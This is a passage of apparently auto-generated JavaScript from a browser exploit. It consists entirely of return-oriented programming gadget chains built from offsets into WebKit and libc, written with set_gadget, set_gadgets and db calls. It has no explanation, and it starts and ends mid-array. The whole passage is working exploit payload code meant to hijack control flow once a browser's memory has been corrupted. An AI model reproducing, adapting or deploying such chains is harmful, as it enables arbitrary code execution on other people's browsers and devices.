ropchain+76184,
webkit_base+7438103,
libc_base+793877,
ropchain+76200,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+76168,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+76304,
webkit_base+7438103,
libc_base+793877,
ropchain+76320,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+76408,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+76464,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+76584,
webkit_base+7438103,
libc_base+793877,
ropchain+76616,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+76600,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+270096,
libc_base+793877,
ropchain+76776,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+76728,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+76744,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+76832,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+76936,
webkit_base+7438103,
libc_base+793877,
ropchain+76968,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+76952,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+77128,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+77080,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+77096,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+77184,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+77288,
webkit_base+7438103,
libc_base+793877,
ropchain+77320,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+77304,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+77480,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+77432,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+77448,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+77536,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+77640,
webkit_base+7438103,
libc_base+793877,
ropchain+77672,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+77656,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+77744,
webkit_base+7438103,
libc_base+793877,
ropchain+77760,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+77880,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+77864,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967283, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+759626,
libc_base+793877
]);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+78008,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+78024,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+78168,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+78136,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+78152,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+78240,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+78296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+78376,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+78480,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+78496,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+78648,
webkit_base+7438103,
libc_base+793877,
ropchain+78680,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+78632,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+78664,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+78800,
webkit_base+7438103,
libc_base+793877,
ropchain+78816,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+78784,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+78904,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+78960,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+79080,
webkit_base+7438103,
libc_base+793877,
ropchain+79112,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+79096,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+270096,
libc_base+793877,
ropchain+79272,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+79224,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+79240,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+79328,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+79432,
webkit_base+7438103,
libc_base+793877,
ropchain+79464,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+79448,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+79624,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+79576,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+79592,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+79680,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+79784,
webkit_base+7438103,
libc_base+793877,
ropchain+79816,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+79800,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+79976,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+79928,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+79944,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+80032,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+80136,
webkit_base+7438103,
libc_base+793877,
ropchain+80168,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+80152,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+80240,
webkit_base+7438103,
libc_base+793877,
ropchain+80256,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+80416,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+80368,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+80384,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+80472,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+80576,
webkit_base+7438103,
libc_base+793877,
ropchain+80608,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+80592,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+80704,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+80688,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+80784,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+80888,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+80904,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+81048,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+81016,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+81032,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+81120,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+81176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([7, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+81304,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+81408,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+81424,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+81576,
webkit_base+7438103,
libc_base+793877,
ropchain+81608,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+81560,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+81592,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+81728,
webkit_base+7438103,
libc_base+793877,
ropchain+81744,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+81712,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+81848,
webkit_base+7438103,
libc_base+793877,
ropchain+81864,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+81952,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+82008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+82080,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+82136,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+82224,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967283, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+82328,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+82344,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270096,
libc_base+793877,
ropchain+82504,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+82456,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+82472,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+82560,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+82664,
webkit_base+7438103,
libc_base+793877,
ropchain+82696,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+82680,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+82856,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+82808,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+82824,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+82912,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+83016,
webkit_base+7438103,
libc_base+793877,
ropchain+83048,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+83032,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+83120,
webkit_base+7438103,
libc_base+793877,
ropchain+83136,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+83296,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+83248,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+83264,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+83352,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+83456,
webkit_base+7438103,
libc_base+793877,
ropchain+83488,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+83472,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+83584,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+83568,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+83664,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+83768,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+83784,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+83928,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+83896,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+83912,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+84000,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+84056,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+84136,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+84240,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+84256,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+84408,
webkit_base+7438103,
libc_base+793877,
ropchain+84440,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+84392,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+84424,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+84560,
webkit_base+7438103,
libc_base+793877,
ropchain+84576,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+84544,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+84664,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+84720,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+84792,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+84848,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,

libc_base+793877,
ropchain+84936,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+85040,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+85056,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+85208,
webkit_base+7438103,
libc_base+793877,
ropchain+85240,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+85192,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+85224,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+85336,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+85320,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+85424,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+85480,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+793877,
ropchain+85560,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+811575,
ropchain+73952,

libc_base+793877,
ropchain+85656,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+85760,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+85776,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+85896,
webkit_base+7438103,
libc_base+793877,
ropchain+85912,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+85880,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+86008,
webkit_base+7438103,
libc_base+793877,
ropchain+86024,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+86136,
webkit_base+7438103,
libc_base+793877,
ropchain+86120,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+86224,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+86208,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+86320,
webkit_base+7438103,
libc_base+793877,
ropchain+86336,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+86448,
webkit_base+7438103,
libc_base+793877,
ropchain+86432,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+86520,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+86584,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([32, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+86736,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+86752,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+86872,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+86856,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967288, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+793877
